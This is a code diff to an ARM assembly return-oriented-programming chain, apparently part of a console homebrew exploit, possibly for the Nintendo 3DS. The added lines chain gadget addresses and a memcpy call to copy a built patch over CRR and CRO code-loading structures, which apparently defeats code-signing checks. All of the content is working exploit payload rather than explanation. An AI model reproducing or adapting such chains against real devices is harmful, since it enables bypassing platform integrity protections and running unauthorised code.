@@ -71,6 +71,22 @@ thread0rop:
 			.word 0xDEADBABE ; r8 (garbage)
 			.word 0xDEADBABE ; r9 (garbage)
 
+		;copy piece that'll have to be patched
+			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
+				.word GSPHEAPBUF ; r0 (dst)
+				.word CRRLOCATION+0x360 ; r1 (src)
+				.word 0x200  ; r2 (size)
+				.word 0xDEADBABE ; r3 (garbage)
+				.word 0xDEADBABE ; r4 (garbage)
+			.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
+				.word 0xDEADBABE ; r4 (garbage)
+				.word 0xDEADBABE ; r5 (garbage)
+				.word 0xDEADBABE ; r6 (garbage)
+				.word 0xDEADBABE ; r7 (garbage)
+				.word 0xDEADBABE ; r8 (garbage)
+				.word 0xDEADBABE ; r9 (garbage)
+				.word 0xDEADBABE ; r10 (garbage)
+
 	;open and read static.crs
 		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
 			.word ROPLOCATION+fileObj+0x100 ; r0 (this)
@@ -126,7 +142,7 @@ thread0rop:
 			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
 				.word GSPHEAPBUF ; r0 (dst)
 				.word ROPLOCATION+crrPatch ; r1 (src)
-				.word 0x00000200  ; r2 (size)
+				.word crrPatch_end-crrPatch  ; r2 (size)
 				.word 0xDEADBABE ; r3 (garbage)
 				.word 0xDEADBABE ; r4 (garbage)
 			.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
@@ -353,9 +369,10 @@ thread0rop:
 		.word 0x00000008 ; flags
 		.word 0x00000000 ; unused
 
-	.align 0x10
+	.align 0x4
 	crrPatch:
-		.incbin "crr_patch.bin"
+		.incbin "../build/cro/patchCRR.bin"
+	crrPatch_end:
 
 	.align 0x4
 	croPatch0:
